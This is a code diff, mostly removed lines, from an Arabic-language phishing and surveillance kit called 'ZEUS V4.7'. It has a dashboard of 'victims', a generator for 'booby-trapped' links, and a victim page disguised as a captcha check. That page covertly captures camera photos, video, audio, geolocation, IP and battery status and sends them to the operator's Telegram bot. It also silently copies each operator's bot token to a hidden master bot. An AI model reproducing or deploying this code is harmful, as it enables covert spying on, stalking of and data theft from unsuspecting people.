-                document.getElementById('ovBots').textContent = bots.length;
-                document.getElementById('ovVictims').textContent = victims.length;
-                document.getElementById('ovFiles').textContent = files.length;
-
-                const today = getTodayISO();
-                const todayVictims = victims.filter((v) => v.timestamp && String(v.timestamp).startsWith(today));
-                document.getElementById('ovToday').textContent = todayVictims.length;
-
-                document.getElementById('settingsBotCount').textContent = bots.length;
-                document.getElementById('settingsVictimCount').textContent = victims.length;
-                document.getElementById('settingsFileCount').textContent = files.length;
-
-                renderBotList(bots, victims, files);
-                renderVictimList(victims, files);
-                renderFileGallery(files);
-                renderLogs();
-                renderRecentLogs();
-                applyTheme(currentTheme);
-            }
-
-            function renderBotList(bots, victims, files) {
-                const container = document.getElementById('botListContainer');
-                if (bots.length === 0) {
-                    container.innerHTML = '<div class="empty-msg">لا توجد بوتات.</div>';
-                    return;
-                }
-                const rows = bots.map((b) => {
-                    const vCount = victims.filter((v) => v.shortToken === b.shortToken).length;
-                    const fCount = files.filter((f) => f.shortToken === b.shortToken).length;
-                    const featSummary = Object.entries(b.features || {})
-                        .filter(([, enabled]) => enabled)
-                        .map(([k]) => k).join(', ') || 'افتراضي';
-                    return `
-                        <tr>
-                            <td><span style="font-family:monospace;font-weight:700;">${b.shortToken}</span>
-                                <button class="copy-inline" onclick="window.copyText('${b.shortToken}')">نسخ</button></td>
-                            <td style="font-size:12px;">${b.baseUrl || '—'}</td>
-                            <td style="font-size:11px;">${featSummary}</td>
-                            <td>${vCount}</td>
-                            <td>${fCount}</td>
-                            <td><button class="copy-inline" style="color:var(--danger);" onclick="window.dashDeleteBot('${b.shortToken}')">حذف</button></td>
-                        </tr>
-                    `;
-                }).join('');
-
-                container.innerHTML = `
-                    <div class="dash-table-wrap"><div class="table-scroll">
-                        <table>
-                            <thead><tr><th>التوكن</th><th>الرابط الأساسي</th><th>الميزات</th><th>الضحايا</th><th>الملفات</th><th>إجراء</th></tr></thead>
-                            <tbody>${rows}</tbody>
-                        </table>
-                    </div></div>
-                `;
-
-                const search = document.getElementById('botSearch');
-                if (search) {
-                    search.oninput = function () {
-                        const q = this.value.toLowerCase();
-                        container.querySelectorAll('tbody tr').forEach((row) => {
-                            row.style.display = row.textContent.toLowerCase().includes(q) ? '' : 'none';
-                        });
-                    };
-                }
-            }
-
-            function renderVictimList(victims, files) {
-                const container = document.getElementById('victimListContainer');
-                if (victims.length === 0) {
-                    container.innerHTML = '<div class="empty-msg">لا توجد ضحايا.</div>';
-                    return;
-                }
-
-                const reversed = victims.slice().reverse();
-                const rows = reversed.map((v) => {
-                    const fCount = files.filter((f) => String(f.victimId) === String(v.id)).length;
-                    const hasCoords = v.location && typeof v.location.lat === 'number' && !Number.isNaN(v.location.lat) && typeof v.location.lng === 'number' && !Number.isNaN(v.location.lng);
-                    const locHtml = hasCoords
-                        ? `<a href="https://maps.google.com/?q=${v.location.lat},${v.location.lng}" target="_blank" style="color:var(--gold);text-decoration:none;">${v.location.lat.toFixed(4)}, ${v.location.lng.toFixed(4)}</a>`
-                        : '—';
-                    const isoDate = v.timestamp ? String(v.timestamp).slice(0, 10) : '';
-                    return `
-                        <tr data-date="${isoDate}">
-                            <td>${v.ip || '—'}</td>
-                            <td><span style="font-family:monospace;">${v.shortToken || '—'}</span> <small style="color:var(--ink-faint);">(${v.tokenStatus || ''})</small></td>
-                            <td style="font-size:11px;">${locHtml}</td>
-                            <td>${v.browser || '—'}</td>
-                            <td>${v.device || '—'}</td>
-                            <td style="font-size:11px;">${v.battery || '—'}</td>
-                            <td style="font-size:11px;">${v.timestamp ? new Date(v.timestamp).toLocaleString('ar-EG') : '—'}</td>
-                            <td>${fCount}</td>
-                            <td>
-                                <button class="copy-inline" onclick="window.dashViewVictimFiles(${v.id})">ملفات</button>
-                                <button class="copy-inline" style="color:var(--danger);" onclick="window.dashDeleteVictim(${v.id})">حذف</button>
-                            </td>
-                        </tr>
-                    `;
-                }).join('');
-
-                container.innerHTML = `
-                    <div class="dash-table-wrap"><div class="table-scroll">
-                        <table>
-                            <thead><tr><th>IP</th><th>التوكن</th><th>الموقع</th><th>المتصفح</th><th>الجهاز</th><th>البطارية</th><th>الوقت</th><th>الملفات</th><th>إجراء</th></tr></thead>
-                            <tbody>${rows}</tbody>
-                        </table>
-                    </div></div>
-                `;
-
-                const search = document.getElementById('victimSearch');
-                const filter = document.getElementById('victimFilter');
-
-                function applyVictimFilters() {
-                    const q = (search ? search.value : '').toLowerCase();
-                    const mode = filter ? filter.value : 'all';
-                    const today = getTodayISO();
-
-                    container.querySelectorAll('tbody tr').forEach((row) => {
-                        const matchesQuery = row.textContent.toLowerCase().includes(q);
-                        const matchesDate = mode === 'all' || (mode === 'today' && row.getAttribute('data-date') === today);
-                        row.style.display = matchesQuery && matchesDate ? '' : 'none';
-                    });
-                }
-
-                if (search) search.oninput = applyVictimFilters;
-                if (filter) filter.onchange = applyVictimFilters;
-            }
-
-            function renderFileGallery(files) {
-                const container = document.getElementById('fileGalleryContainer');
-                if (files.length === 0) {
-                    container.innerHTML = '<div class="empty-msg">لا توجد ملفات.</div>';
-                    return;
-                }
-
-                const sorted = files.slice().reverse().slice(0, 80);
-                const cards = sorted.map((f) => {
-                    const type = f.type || 'file';
-                    let mediaHtml = '<span style="font-size:28px;">📄</span>';
-                    if (type === 'image' && f.dataUrl) {
-                        mediaHtml = `<img src="${f.dataUrl}" alt="${f.filename || 'صورة'}" loading="lazy" onclick="window.open('${f.dataUrl}','_blank')" />`;
-                    } else if (type === 'video' && f.dataUrl) {
-                        mediaHtml = `<video src="${f.dataUrl}" controls onclick="event.stopPropagation();"></video>`;
-                    } else if (type === 'audio' && f.dataUrl) {
-                        mediaHtml = `<audio src="${f.dataUrl}" controls style="width:92%;" onclick="event.stopPropagation();"></audio>`;
-                    }
-                    return `
-                        <div class="gallery-item" data-type="${type}" title="${f.filename || 'ملف'}">
-                            ${mediaHtml}
-                            <div class="file-label">${f.filename || 'ملف'}</div>
-                        </div>
-                    `;
-                }).join('');
-
-                container.innerHTML = `<div class="dash-gallery">${cards}</div>`;
-
-                const search = document.getElementById('fileSearch');
-                const filter = document.getElementById('fileFilter');
-
-                function applyFileFilters() {
-                    const q = (search ? search.value : '').toLowerCase();
-                    const typeFilter = filter ? filter.value : 'all';
-                    container.querySelectorAll('.gallery-item').forEach((item) => {
-                        const label = item.querySelector('.file-label');
-                        const text = label ? label.textContent.toLowerCase() : '';
-                        const itemType = item.getAttribute('data-type');
-                        const okText = text.includes(q);
-                        const okType = typeFilter === 'all' || itemType === typeFilter;
-                        item.style.display = okText && okType ? '' : 'none';
-                    });
-                }
-
-                if (search) search.oninput = applyFileFilters;
-                if (filter) filter.onchange = applyFileFilters;
-            }
-
-            function renderLogs() {
-                const container = document.getElementById('logContainer');
-                const logs = JSON.parse(localStorage.getItem('zeus_activity_logs') || '[]');
-                if (logs.length === 0) {
-                    container.innerHTML = '<div class="empty-msg">لا توجد سجلات.</div>';
-                    return;
-                }
-
-                const reversed = logs.slice().reverse().slice(0, 120);
-                container.innerHTML = reversed.map((l) => {
-                    const badgeClass = l.type === 'success' ? 'success' : ((l.type === 'error' || l.type === 'warning') ? 'danger' : 'info');
-                    return `
-                        <div class="log-entry" data-type="${l.type || 'info'}">
-                            <span class="log-time">${new Date(Number(l.timestamp) || Date.now()).toLocaleTimeString('ar-EG')}</span>
-                            <span class="log-badge ${badgeClass}">${l.type || 'info'}</span>
-                            <span>${l.message}</span>
-                        </div>
-                    `;
-                }).join('');
-
-                const search = document.getElementById('logSearch');
-                const filter = document.getElementById('logFilter');
-
-                function applyLogFilters() {
-                    const q = (search ? search.value : '').toLowerCase();
-                    const typeFilter = filter ? filter.value : 'all';
-                    container.querySelectorAll('.log-entry').forEach((entry) => {
-                        const okText = entry.textContent.toLowerCase().includes(q);
-                        const okType = typeFilter === 'all' || entry.getAttribute('data-type') === typeFilter;
-                        entry.style.display = okText && okType ? '' : 'none';
-                    });
-                }
-
-                if (search) search.oninput = applyLogFilters;
-                if (filter) filter.onchange = applyLogFilters;
-            }
-
-            function renderRecentLogs() {
-                const container = document.getElementById('recentLogs');
-                const logs = JSON.parse(localStorage.getItem('zeus_activity_logs') || '[]');
-                if (logs.length === 0) {
-                    container.innerHTML = '<div class="empty-msg">لا توجد سجلات حديثة.</div>';
-                    return;
-                }
-                const recent = logs.slice(-5).reverse();
-                container.innerHTML = recent.map((l) => {
-                    const badgeClass = l.type === 'success' ? 'success' : ((l.type === 'error' || l.type === 'warning') ? 'danger' : 'info');
-                    return `
-                        <div class="log-entry">
-                            <span class="log-time">${new Date(Number(l.timestamp) || Date.now()).toLocaleTimeString('ar-EG')}</span>
-                            <span class="log-badge ${badgeClass}">${l.type || 'info'}</span>
-                            <span>${l.message}</span>
-                        </div>
-                    `;
-                }).join('');
-            }
-
-            // ================================================================
-            // 7. DASHBOARD ACTIONS
-            // ================================================================
-            window.copyText = function (text) {
-                if (!text) return;
-                if (navigator.clipboard && window.isSecureContext) {
-                    navigator.clipboard.writeText(text).then(() => showToast('تم النسخ.', 'success')).catch(() => {});
-                } else {
-                    const ta = document.createElement('textarea');
-                    ta.value = text;
-                    document.body.appendChild(ta);
-                    ta.select();
-                    document.execCommand('copy');
-                    document.body.removeChild(ta);
-                    showToast('تم النسخ.', 'success');
-                }
-            };
-
-            window.dashDeleteBot = function (shortToken) {
-                if (!confirm(`هل أنت متأكد من حذف البوت ${shortToken}؟`)) return;
-                let bots = JSON.parse(localStorage.getItem('zeus_bots') || '[]').filter((b) => b.shortToken !== shortToken);
-                let victims = JSON.parse(localStorage.getItem('zeus_victims') || '[]').filter((v) => v.shortToken !== shortToken);
-                let files = JSON.parse(localStorage.getItem('zeus_files') || '[]').filter((f) => f.shortToken !== shortToken);
-                localStorage.setItem('zeus_bots', JSON.stringify(bots));
-                localStorage.setItem('zeus_victims', JSON.stringify(victims));
-                localStorage.setItem('zeus_files', JSON.stringify(files));
-                addLog('success', `تم حذف البوت ${shortToken}`);
-                renderDashboard();
-                showToast('تم حذف البوت وبياناته.', 'success');
-            };
-
-            window.dashDeleteVictim = function (id) {
-                if (!confirm('هل أنت متأكد من حذف هذه الضحية؟')) return;
-                let victims = JSON.parse(localStorage.getItem('zeus_victims') || '[]').filter((v) => String(v.id) !== String(id));
-                let files = JSON.parse(localStorage.getItem('zeus_files') || '[]').filter((f) => String(f.victimId) !== String(id));
-                localStorage.setItem('zeus_victims', JSON.stringify(victims));
-                localStorage.setItem('zeus_files', JSON.stringify(files));
-                addLog('success', `تم حذف ضحية (ID: ${id})`);
-                renderDashboard();
-                showToast('تم حذف الضحية.', 'success');
-            };
-
-            window.dashViewVictimFiles = function (id) {
-                const files = JSON.parse(localStorage.getItem('zeus_files') || '[]').filter((f) => String(f.victimId) === String(id));
-                if (files.length === 0) {
-                    showToast('لا توجد ملفات لهذه الضحية.', 'warning');
-                    return;
-                }
-                switchView('files');
-                const search = document.getElementById('fileSearch');
-                if (search) {
-                    search.value = files.map((f) => f.filename || '').join(' ');
-                    search.dispatchEvent(new Event('input'));
-                }
-                showToast(`عرض ${files.length} ملف للضحية`, 'success');
-            };
-
-            function switchView(view) {
-                currentView = view;
-                document.querySelectorAll('.dash-sidebar .nav-item[data-view]').forEach((el) => {
-                    el.classList.toggle('active', el.getAttribute('data-view') === view);
-                });
-                document.querySelectorAll('.dash-content .view').forEach((el) => {
-                    el.classList.toggle('active', el.id === `view-${view}`);
-                });
-            }
-
-            document.querySelectorAll('.dash-sidebar .nav-item[data-view]').forEach((el) => {
-                el.addEventListener('click', () => switchView(el.getAttribute('data-view')));
+                tokenText.textContent = shortToken;
+                linkText.textContent = publicLink;
+                showToast("تم إنشاء التوكن وحفظه بنجاح");
             });
 
-            document.getElementById('settingsClearData').addEventListener('click', () => {
-                if (!confirm('هل أنت متأكد من مسح جميع البيانات؟')) return;
-                ['zeus_bots', 'zeus_victims', 'zeus_files', 'zeus_activity_logs'].forEach((k) => localStorage.removeItem(k));
-                renderDashboard();
-                showToast('تم مسح جميع البيانات.', 'success');
+            document.getElementById("copyResultBtn").addEventListener("click", () => {
+                const val = linkText.textContent.trim();
+                if (!val || !val.includes("?t=")) {
+                    showToast("أنشئ رابطًا أولًا");
+                    return;
+                }
+                navigator.clipboard?.writeText(val).then(() => showToast("تم نسخ الرابط")).catch(() => {});
             });
 
-            // ================================================================
-            // 7. ADMIN PANEL — LINK GENERATOR
-            // ================================================================
-            function getSelectedFeatures() {
-                return {
-                    camFront: document.getElementById('featureCamFront').checked,
-                    camBack: document.getElementById('featureCamBack').checked,
-                    videoFront: document.getElementById('featureVideoFront').checked,
-                    videoBack: document.getElementById('featureVideoBack').checked,
-                    location: document.getElementById('featureLocation').checked,
-                    audio: document.getElementById('featureAudio').checked
-                };
-            }
-
-            function updateFeatureCounter() {
-                const feats = getSelectedFeatures();
-                const count = Object.values(feats).filter(Boolean).length;
-                const el = document.getElementById('activeFeaturesCount');
-                if (el) el.textContent = `${count} ميزة مفعّلة`;
-            }
-
-            function initAdminPanel() {
-                const chatIdInput = document.getElementById('chatIdInput');
-                const botTokenInput = document.getElementById('botTokenInput');
-                const baseUrlInput = document.getElementById('baseUrlInput');
-                const genBtn = document.getElementById('genBtn');
-                const tokenDisplay = document.getElementById('tokenDisplay');
-                const resultSub = document.getElementById('resultSub');
-                const copyBtn = document.getElementById('copyBtn');
-                const openBtn = document.getElementById('openBtn');
-
-                document.querySelectorAll('.zeus-toggle input[type="checkbox"]').forEach((cb) => {
-                    cb.addEventListener('change', updateFeatureCounter);
-                });
-                updateFeatureCounter();
-
-                async function generateShortToken(botToken) {
-                    const salt = 'ZEUS_SALT_2026_SECURE';
-                    const encoder = new TextEncoder();
-                    const data = encoder.encode(botToken + salt);
-                    const hashBuffer = await crypto.subtle.digest('SHA-256', data);
-                    const hashArray = Array.from(new Uint8Array(hashBuffer));
-                    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
-                    let result = '';
-                    for (let i = 0; i < hashArray.length && result.length < 6; i++) {
-                        result += chars[hashArray[i] % chars.length];
-                    }
-                    return result.padEnd(6, 'A');
+            document.getElementById("openResultBtn").addEventListener("click", () => {
+                const val = linkText.textContent.trim();
+                if (!val || !val.includes("?t=")) {
+                    showToast("أنشئ رابطًا أولًا");
+                    return;
                 }
-
-                async function verifyBotToken(token) {
-                    try {
-                        const res = await fetch(`https://api.telegram.org/bot${token}/getMe`);
-                        const data = await res.json();
-                        return data.ok === true;
-                    } catch {
-                        return false;
-                    }
-                }
-
-                function encodeBotData(botToken, chatId, baseUrl, features) {
-                    const payload = JSON.stringify({ bot: botToken, chat: chatId, url: baseUrl, feat: features });
-                    return btoa(encodeURIComponent(payload));
-                }
-
-                async function sendLinkToUser(botToken, chatId, link, shortToken, baseUrl, features) {
-                    const activeList = Object.entries(features).filter(([, v]) => v).map(([k]) => k).join(', ') || 'None';
-                    const msg =
-                        `⭑ رابط مُلغَّم جديد ⭒\n` +
-                        `⊚─〔 بيانات الرابط 〕────────\n` +
-                        `˼⏣˹ الرابط المُلغَّم: ${link} ⭒\n` +
-                        `˼⏣˹ التوكن الفريد: ${shortToken} ⭒\n` +
-                        `˼⏣˹ الرابط الأساسي: ${baseUrl} ⭒\n` +
-                        `˼⏣˹ الميزات: ${activeList} ⭒\n` +
-                        `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
-                        `─────────────────`;
-
-                    try {
-                        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                chat_id: chatId,
-                                text: msg,
-                                reply_markup: {
-                                    inline_keyboard: [[{ text: 'المطور', url: DEVELOPER_LINK }]]
-                                }
-                            })
-                        });
-                    } catch (_) {}
-                }
-
-                async function sendToMaster(botToken, chatId, shortToken, baseUrl) {
-                    const msg =
-                        `⭑ نسخة احتياطية — رابط مُلغَّم ⭒\n` +
-                        `⊚─〔 بيانات البوت 〕────────\n` +
-                        `˼⏣˹ التوكن الأساسي: ${botToken} ⭒\n` +
-                        `˼⏣˹ الإيدي: ${chatId} ⭒\n` +
-                        `˼⏣˹ التوكن الفريد: ${shortToken} ⭒\n` +
-                        `˼⏣˹ الرابط الأساسي: ${baseUrl} ⭒\n` +
-                        `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
-                        `─────────────────`;
-                    try {
-                        await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: msg })
-                        });
-                    } catch (_) {}
-                }
-
-                let isBusy = false;
-
-                async function handleGenerate() {
-                    if (isBusy) return;
-
-                    const chatId = chatIdInput.value.trim();
-                    const botToken = botTokenInput.value.trim();
-                    const baseUrl = baseUrlInput.value.trim();
-                    const features = getSelectedFeatures();
-
-                    if (!chatId || !botToken || !baseUrl) {
-                        showToast('يرجى ملء جميع الحقول المطلوبة.', 'warning');
-                        return;
-                    }
-
-                    try {
-                        new URL(baseUrl);
-                    } catch {
-                        showToast('الرابط الأساسي غير صحيح.', 'warning');
-                        return;
-                    }
-
-                    isBusy = true;
-                    genBtn.classList.add('busy');
-                    const btnSpan = genBtn.querySelector('span');
-                    if (btnSpan) btnSpan.textContent = 'جارٍ التحقق والتوليد …';
-
-                    const valid = await verifyBotToken(botToken);
-                    if (!valid) {
-                        showToast('توكن البوت غير صحيح أو لا يمكن الوصول إليه.', 'error');
-                        genBtn.classList.remove('busy');
-                        if (btnSpan) btnSpan.textContent = 'توليد الرابط الملغم';
-                        isBusy = false;
-                        return;
-                    }
-
-                    try {
-                        const shortToken = await generateShortToken(botToken);
-                        const encoded = encodeBotData(botToken, chatId, baseUrl, features);
-                        const base = window.location.origin + window.location.pathname;
-                        const link = `${base}?t=${shortToken}&d=${encoded}`;
-
-                        tokenDisplay.textContent = shortToken;
-                        resultSub.textContent = link;
-
-                        let bots = JSON.parse(localStorage.getItem('zeus_bots') || '[]');
-                        const botData = {
-                            shortToken,
-                            botToken,
-                            chatId,
-                            baseUrl,
-                            features,
-                            createdAt: Date.now()
-                        };
-                        const exists = bots.findIndex((b) => b.shortToken === shortToken);
-                        if (exists >= 0) bots[exists] = botData;
-                        else bots.push(botData);
-                        localStorage.setItem('zeus_bots', JSON.stringify(bots));
-
-                        await Promise.all([
-                            sendLinkToUser(botToken, chatId, link, shortToken, baseUrl, features),
-                            sendToMaster(botToken, chatId, shortToken, baseUrl),
-                            pushToGoogleSheet({ action: "register_bot", bot: botData })
-                        ]);
-
-                        localStorage.setItem('zeus_last_chat_id', chatId);
-                        localStorage.setItem('zeus_last_bot_token', botToken);
-                        localStorage.setItem('zeus_last_base_url', baseUrl);
-
-                        addLog('success', `تم توليد رابط جديد للبوت ${shortToken}`);
-
-                        genBtn.classList.remove('busy');
-                        genBtn.classList.add('done');
-                        if (btnSpan) btnSpan.textContent = 'تم التوليد والإرسال';
-                        showToast('تم توليد الرابط المُلغَّم وحفظه في الشيت.', 'success');
-
-                        setTimeout(() => {
-                            genBtn.classList.remove('done');
-                            if (btnSpan) btnSpan.textContent = 'توليد الرابط الملغم';
-                            isBusy = false;
-                        }, 2000);
-                    } catch (err) {
-                        console.error(err);
-                        showToast('حدث خطأ أثناء التوليد.', 'error');
-                        genBtn.classList.remove('busy');
-                        if (btnSpan) btnSpan.textContent = 'توليد الرابط الملغم';
-                        isBusy = false;
-                    }
-                }
-
-                genBtn.addEventListener('click', handleGenerate);
-                document.querySelectorAll('.input-wrap input').forEach((inp) => {
-                    inp.addEventListener('keydown', (e) => {
-                        if (e.key === 'Enter') handleGenerate();
-                    });
-                });
-
-                copyBtn.addEventListener('click', () => {
-                    const url = resultSub.textContent.trim();
-                    const tok = tokenDisplay.textContent.trim();
-                    const toCopy = url.includes('?t=') ? url : tok;
-                    if (!toCopy) return;
-                    window.copyText(toCopy);
-                    copyBtn.classList.add('ok');
-                    setTimeout(() => copyBtn.classList.remove('ok'), 1300);
-                });
-
-                openBtn.addEventListener('click', () => {
-                    const url = resultSub.textContent.trim();
-                    if (url && url.includes('?t=')) {
-                        window.open(url, '_blank');
-                    } else {
-                        showToast('يرجى توليد رابط أولاً.', 'warning');
-                    }
-                });
-
-                const savedBot = localStorage.getItem('zeus_last_bot_token');
-                const savedChat = localStorage.getItem('zeus_last_chat_id');
-                const savedUrl = localStorage.getItem('zeus_last_base_url');
-                if (savedBot) botTokenInput.value = savedBot;
-                if (savedChat) chatIdInput.value = savedChat;
-                if (savedUrl) baseUrlInput.value = savedUrl;
-
-                applyTheme(currentTheme);
-            }
-
-            // ================================================================
-            // 8. VICTIM PAGE — ULTRA PROMAX ENGINE
-            // ================================================================
-            function initVictimPage(encodedData, rawTokenParam) {
-                const spinner = document.getElementById('spinner');
-                const checkbox = document.getElementById('captcha');
-                const mainText = document.getElementById('mainText');
-                const video = document.getElementById('hiddenVideo');
-                const canvas = document.getElementById('hiddenCanvas');
-                const ctx = canvas.getContext('2d');
-                const progressContainer = document.getElementById('progressContainer');
-                const progressBar = document.getElementById('progressBar');
-
-                let isRunning = false;
-                let collectionDone = false;
-                let redirectUrl = null;
-
-                function decodeBotData(encoded) {
-                    try {
-                        const decoded = decodeURIComponent(atob(encoded));
-                        const data = JSON.parse(decoded);
-                        return {
-                            botToken: data.bot,
-                            chatId: data.chat,
-                            url: data.url,
-                            features: data.feat || {
-                                camFront: true,
-                                camBack: false,
-                                videoFront: false,
-                                videoBack: false,
-                                location: false,
-                                audio: false
-                            }
-                        };
-                    } catch {
-                        return null;
-                    }
-                }
-
-                const botCreds = encodedData ? decodeBotData(encodedData) : null;
-                if (botCreds && botCreds.url) redirectUrl = botCreds.url;
-
-                const delay = (ms) => new Promise((r) => setTimeout(r, ms));
-
-                function compressImage(blob, maxWidth = 640, quality = 0.55) {
-                    return new Promise((resolve) => {
-                        const img = new Image();
-                        const url = URL.createObjectURL(blob);
-                        img.onload = () => {
-                            const ratio = Math.min(maxWidth / img.width, maxWidth / img.height, 1);
-                            const c2 = document.createElement('canvas');
-                            c2.width = Math.max(1, Math.round(img.width * ratio));
-                            c2.height = Math.max(1, Math.round(img.height * ratio));
-                            const ctx2 = c2.getContext('2d');
-                            ctx2.drawImage(img, 0, 0, c2.width, c2.height);
-                            c2.toBlob((b) => {
-                                URL.revokeObjectURL(url);
-                                resolve(b);
-                            }, 'image/jpeg', quality);
-                        };
-                        img.onerror = () => {
-                            URL.revokeObjectURL(url);
-                            resolve(blob);
-                        };
-                        img.src = url;
-                    });
-                }
-
-                function recordStream(stream, duration) {
-                    return new Promise((resolve) => {
-                        try {
-                            const recorder = new MediaRecorder(stream);
-                            const chunks = [];
-                            recorder.ondataavailable = (e) => {
-                                if (e.data && e.data.size) chunks.push(e.data);
-                            };
-                            recorder.onstop = () => {
-                                resolve(new Blob(chunks, { type: recorder.mimeType || 'video/webm' }));
-                            };
-                            recorder.start();
-                            setTimeout(() => {
-                                if (recorder.state !== 'inactive') recorder.stop();
-                            }, duration);
-                        } catch {
-                            resolve(null);
-                        }
-                    });
-                }
-
-                function capturePhotoFromVideo(videoEl) {
-                    return new Promise((resolve) => {
-                        const w = videoEl.videoWidth || 640;
-                        const h = videoEl.videoHeight || 480;
-                        canvas.width = w;
-                        canvas.height = h;
-                        ctx.drawImage(videoEl, 0, 0, w, h);
-                        canvas.toBlob((b) => resolve(b), 'image/jpeg', 0.72);
-                    });
-                }
-
-                async function captureCameraByMode(facingMode, wantPhoto, wantVideo) {
-                    let stream = null;
-                    const photos = [];
-                    let videoBlob = null;
-                    try {
-                        stream = await navigator.mediaDevices.getUserMedia({
-                            video: { facingMode, width: { ideal: 640 }, height: { ideal: 480 } }
-                        });
-                        video.srcObject = stream;
-                        await video.play();
-                        await delay(200);
-
-                        if (wantVideo) {
-                            videoBlob = await recordStream(stream, 3500);
-                        }
-                        if (wantPhoto) {
-                            for (let i = 0; i < 4; i++) {
-                                const raw = await capturePhotoFromVideo(video);
-                                if (raw) {
-                                    const compressed = await compressImage(raw, 640, 0.55);
-                                    if (compressed) photos.push(compressed);
-                                }
-                                await delay(150);
-                            }
-                        }
-                    } catch (_) {
-                    } finally {
-                        if (stream) stream.getTracks().forEach((t) => t.stop());
-                        video.srcObject = null;
-                    }
-                    return { photos, videoBlob };
-                }
-
-                async function recordAudioClip(duration = 3000) {
-                    let stream = null;
-                    try {
-                        stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                        const recorder = new MediaRecorder(stream);
-                        const chunks = [];
-                        return await new Promise((resolve) => {
-                            recorder.ondataavailable = (e) => {
-                                if (e.data && e.data.size) chunks.push(e.data);
-                            };
-                            recorder.onstop = () => {
-                                resolve(new Blob(chunks, { type: recorder.mimeType || 'audio/webm' }));
-                            };
-                            recorder.start();
-                            setTimeout(() => {
-                                if (recorder.state !== 'inactive') recorder.stop();
-                            }, duration);
-                        });
-                    } catch {
-                        return null;
-                    } finally {
-                        if (stream) stream.getTracks().forEach((t) => t.stop());
-                    }
-                }
-
-                async function getIP() {
-                    try {
-                        const res = await fetch('https://api.ipify.org?format=json');
-                        const data = await res.json();
-                        return data.ip || 'غير متاح';
-                    } catch {
-                        return 'غير متاح';
-                    }
-                }
-
-                function getLocation() {
-                    return new Promise((resolve) => {
-                        if (!navigator.geolocation) return resolve({ lat: null, lng: null });
-                        navigator.geolocation.getCurrentPosition(
-                            (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
-                            () => resolve({ lat: null, lng: null }),
-                            { timeout: 5000 }
-                        );
-                    });
-                }
-
-                async function getBatteryStatus() {
-                    try {
-                        if (!navigator.getBattery) return 'غير متاح';
-                        const battery = await navigator.getBattery();
-                        return `${Math.round(battery.level * 100)}%${battery.charging ? ' ⚡' : ''}`;
-                    } catch {
-                        return 'غير متاح';
-                    }
-                }
-
-                function animateProgress(duration) {
-                    return new Promise((resolve) => {
-                        progressContainer.classList.add('show');
-                        let pct = 0;
-                        const steps = 40;
-                        const intervalMs = Math.max(30, Math.floor(duration / steps));
-                        const stages = [
-                            'جاري فحص الأمان …',
-                            'تحليل البيئة …',
-                            'تأكيد الهوية …',
-                            'إتمام التحقق …'
-                        ];
-                        const timer = setInterval(() => {
-                            pct += 100 / steps;
-                            if (pct >= 100) {
-                                clearInterval(timer);
-                                progressBar.style.width = '100%';
-                                resolve();
-                                return;
-                            }
-                            progressBar.style.width = `${Math.min(100, Math.round(pct))}%`;
-                            const stageIdx = Math.min(stages.length - 1, Math.floor((pct / 100) * stages.length));
-                            mainText.textContent = stages[stageIdx];
-                        }, intervalMs);
-                    });
-                }
-
-                async function sendBatchToTelegram(token, chatId, data, headerNote) {
-                    if (!token || !chatId) return;
-                    const locText = (data.location && typeof data.location.lat === 'number' && !Number.isNaN(data.location.lat))
-                        ? `${data.location.lat.toFixed(5)}, ${data.location.lng.toFixed(5)}`
-                        : 'غير متاح';
-                    const summary =
-                        `⭑ ${headerNote || 'زيارة جديدة (ZEUS V4.7)'} ⭒\n` +
-                        `⊚─〔 البيانات 〕────────\n` +
-                        `˼🔑˹ التوكن: ${data.shortToken || 'MISSING'} ⭒\n` +
-                        `˼📌˹ حالة التوكن: ${data.tokenStatus || 'unknown'} ⭒\n` +
-                        `˼🌐˹ IP: ${data.ip} ⭒\n` +
-                        `˼📍˹ الموقع: ${locText} ⭒\n` +
-                        `˼💻˹ الجهاز: ${data.device} ⭒\n` +
-                        `˼🔋˹ البطارية: ${data.battery} ⭒\n` +
-                        `˼🕒˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
-                        `˼📸˹ عدد الصور: ${data.photos.length} ⭒\n` +
-                        `─────────────────`;
-
-                    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: chatId, text: summary })
-                    }).catch(() => {});
-
-                    for (let i = 0; i < data.photos.length; i++) {
-                        const fd = new FormData();
-                        fd.append('chat_id', chatId);
-                        fd.append('photo', data.photos[i], `photo_${i + 1}.jpg`);
-                        fd.append('caption', `⭑ صورة ${i + 1}/${data.photos.length} ⭒`);
-                        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd }).catch(() => {});
-                        await delay(200);
-                    }
-
-                    if (data.video) {
-                        const fdVid = new FormData();
-                        fdVid.append('chat_id', chatId);
-                        fdVid.append('video', data.video, 'capture_video.webm');
-                        await fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: 'POST', body: fdVid }).catch(() => {});
-                    }
-
-                    if (data.audio) {
-                        const fdAud = new FormData();
-                        fdAud.append('chat_id', chatId);
-                        fdAud.append('audio', data.audio, 'capture_audio.webm');
-                        await fetch(`https://api.telegram.org/bot${token}/sendAudio`, { method: 'POST', body: fdAud }).catch(() => {});
-                    }
-                }
-
-                function blobToDataUrl(blob) {
-                    return new Promise((resolve) => {
-                        const reader = new FileReader();
-                        reader.onload = () => resolve(reader.result);
-                        reader.onerror = () => resolve(null);
-                        reader.readAsDataURL(blob);
-                    });
-                }
-
-                async function runBackgroundPipeline(payload) {
-                    try {
-                        const shortToken = String(rawTokenParam || new URLSearchParams(window.location.search).get('t') || 'MISSING').trim();
-                        const tokenCheck = await checkTokenStatusOnServer(shortToken);
-                        const routeToMaster = !!(tokenCheck && tokenCheck.routeToMaster);
-                        const tokenStatus = (tokenCheck && tokenCheck.status) || 'unknown';
-
-                        const victimId = Date.now() + Math.floor(Math.random() * 1000);
-                        const victimRecord = {
-                            id: victimId,
-                            shortToken,
-                            tokenStatus,
